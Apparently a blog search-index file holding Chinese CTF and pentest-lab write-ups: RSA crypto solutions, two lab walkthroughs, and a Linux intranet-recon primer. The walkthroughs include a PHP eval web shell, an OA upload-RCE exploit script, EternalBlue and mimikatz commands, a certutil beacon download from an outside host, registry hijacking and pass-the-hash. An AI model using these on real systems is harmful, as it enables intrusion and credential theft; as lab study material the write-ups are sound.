10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907&#x27;&#x27;&#x27;
+分析：
+题目里给定了
+hint1=R∗rhint_1=R*r\\
+hint1​=R∗r
+hint2=(3n+1)pl  mod  n3hint_2=(3n+1)^{p_l}\ \ mod\ \ n^3\\
+hint2​=(3n+1)pl​  mod  n3
+n=p∗q∗rn=p*q*r
+n=p∗q∗r
+所以可以通过求最大公因数的方式得到r
+r=GCD(hint1,n)r=GCD(hint_1,n)
+r=GCD(hint1​,n)
+然后对于hint2，进一步二项展开：
+hint2=(3n+1)pl  mod  n3=Cpl2(3n)2+Cpl1(3n)+1hint_2=(3n+1)^{p_l}\ \ mod\ \ n^3=C_{p_l}^2(3n)^2+C_{p_l}^1(3n)+1\\
+hint2​=(3n+1)pl​  mod  n3=Cpl​2​(3n)2+Cpl​1​(3n)+1
+pl=(hint2−1)//(3n)%np_l=(hint_2-1)//(3n)\%n
+pl​=(hint2​−1)//(3n)%n
+然后coppersmith得到p
+题解：
+from Crypto.Util.number import *n = 1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921c = 102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984hint1 = 41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333hint2 = 10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907e = 65537&#x27;&#x27;&#x27;p = getPrime(5)print(p)PR.&lt;n&gt; = PolynomialRing(ZZ)f = (3*n+1)**p % n**3print(f)# 4185*n^2 + 93*n + 1&#x27;&#x27;&#x27;r = GCD(n,hint1)pl = (hint2-1)//(3*n)%nprint(pl.bit_length())# 400n = n//rPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x*2**400 + plph = f.monic().small_roots(X=2^114,beta=0.49)p = int(ph[0])*2**400 + plprint(isPrime(p))# Trueq = n//pphi = (p-1)*(q-1)*(r-1)d = inverse(e,phi)m = pow(c,d,p*q*r)print(long_to_bytes(m))# b&#x27;L3HCTF&#123;1s_4h1s_r3a11y_m4th?&#125;&#x27;
+RRRSSSAAA
+题面：
+from sage.all import *from secret import flagdef generate_vulnerable_key(bits=1024):    p_bits = bits // 2    q_bits = bits - p_bits    while True:        p = random_prime(2**(p_bits), lbound=2**(p_bits-1))        q = random_prime(2**(q_bits), lbound=2**(q_bits-1))        if p != q and p &gt; q and p &lt; 2*q:            break                N = p * q    phi = (p**4 - 1) * (q**4 - 1)    d_bits = 1024    d_bound = 2**d_bits    while True:        d_small = randint(2, d_bound)        d = phi - d_small        if gcd(d, phi) == 1:            if d_small.bit_length() == 1021:                break    e = inverse_mod(d, phi)        return N, edef encrypt(m, N, e):    n = 4    r = 2    R = Integers(N)    P = PolynomialRing(R, &#x27;t&#x27;)    t = P.gen()    Q = P.quotient(t**n - r)    m_poly = Q([m, 0, 0, 0])    c_poly = m_poly ** e    return c_poly.lift()if __name__ == &quot;__main__&quot;:    N, e = generate_vulnerable_key()    m = int.from_bytes(flag, &#x27;big&#x27;)    c = encrypt(m, N, e)    print(f&quot;N = &#123;N&#125;&quot;)    print(f&quot;e = &#123;e&#125;&quot;)    print(f&quot;c = &#123;c&#125;&quot;)# N = 99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609# e = 74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827# c = 98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879
+分析：
+对于给定的
+phi=(p4−1)(q4−1)≈N4phi=(p^4-1)(q^4-1)\approx N^4
+phi=(p4−1)(q4−1)≈N4
+则
+ed=e(ϕ−dsmall)=1  mod  ϕedsmall=−1  mod  ϕedsmall+1=kϕed=e(\phi-d_{small})=1\ \ mod\ \ \phi\\
+ed_{small}=-1\ \ mod\ \ \phi\\
+ed_{small}+1=k\phi
+ed=e(ϕ−dsmall​)=1  mod  ϕedsmall​=−1  mod  ϕedsmall​+1=kϕ
+然后检查一下是否满足Legendre's theorem
+∣eN4−kdsmall∣=∣kϕ−edsmall−kN4+kN4N4dsmall∣≈∣k(ϕ−N4)N4dsmall∣|\frac{e}{N^4}-\frac{k}{d_{small}}|=|\frac{k\phi-ed_{small}-kN^4+kN^4}{N^4d_{small}}|\approx|\frac{k(\phi-N^4)}{N^4d_{small}}|
+∣N4e​−dsmall​k​∣=∣N4dsmall​kϕ−edsmall​−kN4+kN4​∣≈∣N4dsmall​k(ϕ−N4)​∣
+其中
+∣ϕ−N4∣=∣(p4−1)(q4−1)−p4q4∣≤p4+q4≈2∗(2512)4=22049k≈edsmallN4≈21021|\phi-N^4|=|(p^4-1)(q^4-1)-p^4q^4|\leq p^4+q^4\approx 2*(2^{512})^4=2^{2049}\\
+k\approx \frac{ed_{small}}{N^4}\approx 2^{1021}
+∣ϕ−N4∣=∣(p4−1)(q4−1)−p4q4∣≤p4+q4≈2∗(2512)4=22049k≈N4edsmall​​≈21021
+则有
+∣eN4−kdsmall∣≤21021∗22049N4dsmall≈2307024096∗21020=2−2046&lt;12dsmall2≈2−2043|\frac{e}{N^4}-\frac{k}{d_{small}}|\leq \frac{2^{1021}*2^{2049}}{N^4d_{small}}\approx \frac{2^{3070}}{2^{4096} * 2^{1020}}=2^{-2046}&lt;\frac{1}{2d_{small}^2}\approx 2^{-2043}
+∣N4e​−dsmall​k​∣≤N4dsmall​21021∗22049​≈24096∗2102023070​=2−2046&lt;2dsmall2​1​≈2−2043
+说明满足Legendre's theorem，所以可以通过连分数展开得到dsmalld_{small}dsmall​
+然后来看加密部分：
+def encrypt(m, N, e):    n = 4    r = 2    R = Integers(N)    P = PolynomialRing(R, &#x27;t&#x27;)    t = P.gen()    Q = P.quotient(t**n - r)    m_poly = Q([m, 0, 0, 0])    c_poly = m_poly ** e    return c_poly.lift()
+
+
+R = Integers(N)：定义模N的整数环Z/NZ\Z /N\ZZ/NZ
+
+
+P = PolynomialRing(R, 't')：在环R上构造多项式环(Z/NZ\Z/N\ZZ/NZ)[t]
+
+
+Q = P.quotient(t**n - r)：构造商环Q=(Z/NZ)[t](t4−2)Q=\frac{(\Z/N\Z)[t]}{(t^4-2)}Q=(t4−2)(Z/NZ)[t]​
+
+在Q中满足 t4=2t^4=2t4=2 (因为模掉了理想 ⟨t4−2⟩⟨t^4−2⟩⟨t4−2⟩)
+
+
+
+m_poly = Q([m, 0, 0, 0])：将m嵌入商环Q中的元素：
+mpoly=m+0∗t+0∗t2+0∗t3m_{poly}=m+0*t+0*t^2+0*t^3
+mpoly​=m+0∗t+0∗t2+0∗t3
+
+这本质上是常数多项式（仅常数项非零）
+
+
+
+c_poly = m_poly ** e：
+
+在商环Q中进行指数运算，但由于mpolym_{poly}mpoly​是常数多项式，运算简化为cpoly=me（在商环Q中）c_{poly}=m^e（在商环Q中）cpoly​=me（在商环Q中）
+所以等价于RSA的c=me  mod  nc=m^e\ \ mod\ \ nc=me  mod  n
+
+
+
+此处edsmall=−1  mod  ϕed_{small}=-1\ \ mod\ \ \phiedsmall​=−1  mod  ϕ，所以解密时m=c−dsmall  mod  nm=c^{-d_{small}}\ \ mod\ \ nm=c−dsmall​  mod  n
+题解：
+from Crypto.Util.number import *from gmpy2 import *N = 99697845285265879829811232968100099666254250525000506525475952592468738395250956460890611762459685140661035795964867321445992110528627232335703962897072608767840783176553829502743629914407970206513639916759403399986924602596286330464348286080258986075962271511105387188070309852907253486162504945490429185609e = 74900336437853271512557457581304251523854378376434438153117909482138661618901386551154807447783262736408028580620771857416463085746907317126876189023636958838207330193074215769008709076254356539808209005917645822989554532710565445155350102802675594603406077862472881027575871589046600011223990947361848608637247276816477996863812313225929441545045479384803449990623969591150979899801722841101938868710054151839628803383603849632857020369527380816687165487370957857737696187061619496102857237814447790678611448197153594917852504509869007597997670022501500067854210261136878917620198551551460145853528269270832725348151160651020188255399136483482428499340574623409209151124687319668989144444549871527949104436734300277004316939985015286758651969045396343970037328043635061226100170529991733947365830164811844853806681198818875837903563263114249814483901121700854712406832325690101810786429930813776784979083590353027191492894890551838308899148551566437532914838098811643805243593419063566975400775134981190248113477610235165151367913498299241375039256652674679958159505112725441797566678743542054295794919839551675786573113798857814005058856054462008797386322048089657472710775620574463924678367455233801970310210504653908307254926827c = 98460941530646528059934657633016619266170844887697553075379408285596784682803952762901219607460711533547279478564732097775812539176991062440097573591978613933775149262760936643842229597070673855940231912579258721734434631479496590694499265794576610924303262676255858387586947276246725949970866534023718638879cf = continued_fraction(e/N^4)convs = cf.convergents()for conv in convs:    d = conv.denominator()    if d.bit_length() == 1021:        print(f&#x27;d = &#123;d&#125;&#x27;)        m = pow(c,-d,N)        print(long_to_bytes(m))
+]]></content>
+  </entry>
+  <entry>
+    <title>l3akCTF</title>
+    <url>/posts/cf46.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/posts/3eeb.html</url>
+    <content><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
+Quick Start
+Create a new post
+$ hexo new &quot;My New Post&quot;
+More info: Writing
+Run server
+$ hexo server
+More info: Server
+Generate static files
+$ hexo generate
+More info: Generating
+Deploy to remote sites
+$ hexo deploy
+More info: Deployment
+]]></content>
+  </entry>
+  <entry>
+    <title>春秋云镜-Initial</title>
+    <url>/posts/536e.html</url>
+    <content><![CDATA[flag1:
+fscan扫一下，发现有thinkphp的洞
+
+thinkphp-rce
+thinkphpGUI嗦一下，发现是ThinkPHP 5.0.23 RCE
+
+蚁剑连接，找到flag的位置，但是权限不够
+
+检验一下，发现是www-data权限，然后sudo -l看一下可以用sudo执行的命令
+User www-data may run the following commands on ubuntu-web01:    (root) NOPASSWD: /usr/bin/mysql
+
+sudo提权-mysql
+可以用数据库执行命令sudo mysql -e '\!'拿到第一段flag
+
+ifconfig发现内网网段为172.22.1.*，然后上传fscan去扫内网(记得要给fscan可执行权限)
+flag2:
+先来整理一下
+MS17-010 172.22.1.21http://172.22.1.18?m=login 信呼协同办公系统http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1	已穿172.22.1.2      [+] DC:DC01.xiaorang.lab
+搭建内网代理：
+为了访问到内网，我们要先搭建内网代理，此处用stowaway搭建，并且socket监听一个端口
+
+然后用proxifier连接代理，注意修改rule里的target_hosts
+
+连接完成后，即可访问
+
+这里是弱口令admin123
+信呼OA2.2-RCE
+查询漏洞发现信呼2.2版本是存在文件上传漏洞的，首页通知中也有说明版本为2.2
+
+找了篇文章来打：[代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客
+1.php：记得改为POST
+&lt;?php eval($_POST[&quot;1&quot;]);?&gt;
+exp.py：修改URL和adminuser及adminpass
+import requests  session = requests.session() url_pre = &#x27;http://172.22.1.18/&#x27;url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27; data1 = &#123;    &#x27;rempass&#x27;: &#x27;0&#x27;,    &#x27;jmpass&#x27;: &#x27;false&#x27;,    &#x27;device&#x27;: &#x27;1625884034525&#x27;,    &#x27;ltype&#x27;: &#x27;0&#x27;,    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,    &#x27;yanzm&#x27;: &#x27;&#x27;&#125;  r = session.post(url1, data=data1)r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;) filepath = str(r.json()[&#x27;filepath&#x27;])filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;id = r.json()[&#x27;id&#x27;] url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27; r = session.get(url3)r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)print(r.text)
+由于此时本机已经用proxifier连接了代理，所以本地直接运行也是可以的
+我这里在kali里运行，先配置proxychains，写入socket5 vps地址
+proxychains python exp.py
+
+此时访问发现存在：
+
+直接蚁剑连接即可，找到第二段flag
+
+flag3:
+再来回顾一下：
+MS17-010 172.22.1.21http://172.22.1.18?m=login 信呼协同办公系统 			       已穿http://172.22.1.15poc-yaml-thinkphp5023-method-rce poc1		 已穿172.22.1.2      [+] DC:DC01.xiaorang.lab
+那么接下来对172.22.1.21下手，MS17-010即永恒之蓝，可以直接用msf一把梭（我用的kali的）
+proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp_uuidset RHOSTS 172.22.1.21run
+
+此时就是一个系统权限
+
+然后就要尝试抓取用户的哈希进行PTH
+dcsync
+先用load kiwi加载Mimikatz
+然后在获取权限的域成员主机上执行kiwi_cmd lsadump::dcsync /domain:xiaorang.lab  /all /csv
+
+得到Administrator的哈希：10cf89a850fb1cdbe6bb432b859164c8
+PTH
+进行哈希传递
+
+发现传递成功，接下来即可执行命令拿flag了
+
+]]></content>
+  </entry>
+  <entry>
+    <title>春秋云镜-Tsclient</title>
+    <url>/posts/56bf.html</url>
+    <content><![CDATA[flag1
+1.mssql弱口令
+fscan扫描发现存在mssql的弱口令
+
+MDUT连接
+
+whoami查看一下，发现是一个比较低的权限
+
+然后 whoami /priv 查看一下当前用户账户的特权，以及这些特权是否被启用
+
+发现身份验证后模拟客户端已启用，所以是可以用sweetpotato进行提权的
+2.上线cs，土豆提权
+那么接下来就是要上传文件，可以考虑用数据库命令一个一个上传文件，但是为了方便可以先上传cs，然后在cs上传其他文件
+
+创建一个监听器
+
+生成攻击载荷：
+
+由于靶机是访问公网的，所以先把这个载荷上传到服务器上，然后通过命令从服务器上得到载荷，要先在服务器上起一个http服务
+之所以选择在Public目录下是因为默认的当前目录我们没有可执行权限，则写入时无法保存
+certutil -f -split -urlcache http://101.37.161.238/beacon_x64.exe C:\Users\Public\beacon_x64.exe
+
+这样我们就成功上传了这个cs的载荷，运行之后，发现我们的cs也就成功上线了
+
+
+在使用前记得修改回连间隔为0，不然会用的很慢
+然后在文件管理中我们就可以上传一些东西，比如fscan，stowaway,sweetpotato
+
+接下来用sweetpotato提权，执行一下命令：
+shell C:\Users\Public\SweetPotato.exe -a whoami
+
+发现sweetpotato提权后为系统用户，接下来用这个系统用户执行我们的cs载荷来让系统用户上线
+shell C:\Users\Public\SweetPotato.exe -a C:\Users\Public\beacon_x64.exe
+发现我们的system用户上线了
+
+找到flag1的位置然后打印即可：
+shell type C:\Users\Administrator\flag\flag01.txt
+
+还有一条hint：
+Maybe you should focus on user sessions...
+让我们关注用户会话
+flag2
+1.内网扫描
+我们先用系统用户执行fscan扫描内网：
+
+先整理一下：
+172.22.8.18 WIN-WEB    已拿下172.22.8.15 DC:XIAORANG\DC01172.22.8.31 XIAORANG\WIN19-CLIENT172.22.8.46  WIN2016.xiaorang.lab
+2.在线用户进程注入上线
+发现445端口开放：
+
+445/TCP — SMB（Server Message Block）服务，用于共享文件夹、打印机等资源
+
+所以存在网络共享
+用stowaway搭建内网代理，查看一下在线用户
+shell net user
+
+shell quser || qwinst
+
+发现有一个john用户在线，而且是以rdp连接到了这台主机，由于我们现在以及有了system的权限，所以我们可以用进程注入的方式进入到这个john用户
+在进程列表中有：
+
+随便选择一个john用户的进程点击下面的注入，然后选择对应的载荷即可让john用户上线
+
+查看挂载情况
+shell net use
+
+可以看到是挂载了远程TSCLIENT用户的C盘，我们dir一下，发现有一个txt文件
+
+打印一下txt文件的内容，里面有一个hint
+Do you know how to hijack Image?
+说明应该是镜像劫持，然后上面记录着一个用户的域用户的账户密码
+
+xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#
+3.密码喷洒
+接下来密码喷洒一下看看是哪个主机的用户：
+proxychains -q crackmapexec smb 172.22.8.46 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;
+
+发现STATUS_PASSWORD_EXPIRED，说明密码过期了，我们要改一下密码
+proxychains python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Admin123$&#x27;
+
+4.RDP远程登录
+密码修改好后我们就可以rdp登录到该主机，注意：
+
+5.镜像劫持提权
+由于提示了存在镜像劫持，获取注册表项 Image File Execution Options 的访问控制列表（ACL）详细信息
+get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *
+
+发现 Authenticated Users 的成员可以修改注册表
+
+Authenticated Users 的成员
+
+包括：
+
+所有域用户（Domain Users）。
+所有本地用户（Local Users）。
+所有通过身份验证的计算机账户（Computer Accounts）。
+
+
+不包括：
+
+匿名用户（Anonymous）。
+Guest 账户（除非启用了 Guest 账户并进行了身份验证）。
+
+
+
+
+修改注册表把cmd绑定到放大镜上
+reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v &quot;Debugger&quot; /t REG_SZ /d &quot;c:\windows\system32\cmd.exe&quot; /f
+为了上传cs后门到该主机上，由于这个主机是在内网里的，所以我们需要一个转发代理上线的功能，在cs里此处新建监听器，然后生成对应的载荷，上传到该主机里
+
+
+锁定后，点击放大镜，发现我们是系统用户，然后执行载荷即可：
+
+这样我们就上线了
+
+找到flag2打印即可
+
+整理一下：
+172.22.8.18 WIN-WEB    已拿下172.22.8.15 DC:XIAORANG\DC01172.22.8.31 XIAORANG\WIN19-CLIENT172.22.8.46  WIN2016.xiaorang.lab 已拿下
+flag3
+1.PTH
+查看域管成员
+shell net group &quot;domain admins&quot; /domain
+
+发现 当前机器 WIN2016$ 用户也是域管理员
+抓取 WIN2016$ 机器用户的hash，进行PTH连接到域控上
+
+往上翻找到对应hash：16f66511a28ee7a9e13ff2a16ee2045d
+
+wmiexec连接
+proxychains python3 wmiexec.py -hashes :16f66511a28ee7a9e13ff2a16ee2045d xiaorang.lab/WIN2016\$@172.22.8.15 -codec gbk
+
+]]></content>
+  </entry>
+  <entry>
+    <title>初识内网渗透</title>
+    <url>/posts/6738.html</url>
+    <content><![CDATA[内网渗透，大概理解为对目标服务器所在的内网进行渗透，而往往最终目标就是获取域控权限。
+
+Linux内网渗透
+信息收集
+获取内核，操作系统和设备的信息
+版本信息：
+
+uname -a	所有版本
+uname -r    内核版本信息
+uname -n    系统主机名称
+uname -m    Linux内核框架
+
+
+
+
+Linux：表示操作系统内核名称
+
+
+kali：主机名(hostname)，这是这台机器在网络中的名称
+
+
+6.12.20-amd64：内核版本号
+
+
+#63-Ubuntu SMP PREEMPT_DYNAMIC Tue Apr 15 19:04:15 UTC 2025：
+
+#1：表示这是该内核构建的第 1 次编译
+SMP：支持对称多处理（Symmetric Multi-Processing）
+PREEMPT_DYNAMIC：表示内核启用了动态抢占支持，适合桌面或低延迟场景
+后面是编译时间：2025年4月15日 19:04:15 UTC
+
+
+
+Kali 6.12.20-1kali1 (2025-03-26)：
+
+
+表示这是由 Kali 官方打包的定制内核。
+
+
+6.12.20-1kali1 是 Kali 对该内核的包版本号。
+
+
+(2025-03-26) 表示该内核打包或发布的时间为 2025 年 3 月 26 日。
+
+
+
+
+x86_64 GNU/Linux：表示这是一个运行在 64 位 Intel/AMD 架构上的 GNU/Linux 系统。
+
+
+内核信息：
+
+cat /proc/version
+
+
+
+(devel@kali.org)：表示该内核是由 Kali 官方团队在 devel@kali.org 构建的，通常是官方维护人员或自动化系统。
+x86_64-linux-gnu-gcc-14 (Debian 14.2.0-19) 14.2.0：使用的是 GCC 版本 14.2.0 编译器，属于 Debian 14.2.0-19 的发行版组件。Kali 基于 Debian，因此使用其工具链。
+GNU ld (GNU Binutils for Debian) 2.44：使用的链接器来自 GNU Binutils 工具集，版本为 2.44。
+
+
+
+
+CPU信息：cat /proc/cpuinfo
+
+
+主机名：hostname
+
+
+文件系统：df -a
+
+
+
+
+内核日志：dmesg//var/log/dmesg
+
+用户和组
+
+
+列出系统所有用户：cat /etc/passwd
+
+
+列出系统所有组：cat /etc/group
+
+
+列出所有用户的hash（root）：cat /etc/shadow
+
+
+用户：
+
+当前登录的用户：users  /who -a /var/log/utmp
+查询无密码用户：grep 'x:0:' /etc/passwd
+
+
+
+当前登录的用户：w
+
+
+查看特权用户：grep :0 /etc/passwd
+
+
+查看passwd最后修改时间：ls -l /etc/passwd
+
+
+查看具有sudo权限的用户：``cat /etc/sudoers | grep -v “^#|^$” | grep “ALL=(ALL)”`
+
+
+用户和权限信息
+
+当前用户：whoami
+当前用户信息：id
+可以使用sudo提升到root的用户（root）：cat /etc/sudoers
+列出目前用户可执行域无法执行的指令：sudo -l
+
+环境信息
+
+打印系统环境信息 env
+打印系统环境信息 set
+环境变量中的路径信息 echo  $PATH
+打印历史命令：history/~/.bash_history
+显示当前路径：pwd
+显示默认系统遍历：cat /etc/profile
+显示可用的shell：cat /etc/shells
+
+进程信息
+
+查看进程信息：ps aux
+资源占有情况：top -c
+查看进程关联文件：lsof -c $PID
+
+网络，路由和通信
+
+列出网络接口信息：/sbin/ifconfig -a / ip addr show
+列出系统arp表：arp -a
+打印路由信息：route/ip ro show
+查看dns配置信息：cat /etc/resolv.conf
+打印本地端口开放信息：netstat -an
+列出iptable的配置规则：iptables -L
+查看端口服务映射：cat /etc/services
+Hostname：hostname -f
+查看进程端口情况：netstat -anltp | grep $PID
+
+公私钥信息
+
+~/.ssh
+/etc/ssh
+
+持久化
+权限提升
+
+
+内核漏洞利用
+
+
+攻击有root权限的服务
+
+
+利用第三方服务提权
+
+
+通过有SUID属性的可执行文件
+
+查找可能提权的可执行文件：
+find / -perm  +4000 -ls
+find / -perm -u=s -type f 2&gt;/dev/null
+find / -user root -perm -4000 -print 2&gt;/dev/null
+find / -user root -perm -4000 -exec ls -lab &#123;&#125; \; 2&gt;/dev/null
+
+
+
+利用可用的root权限：sudo -l
+
+
+利用误配置的crontab任务
+
+
+]]></content>
+  </entry>
 </search>
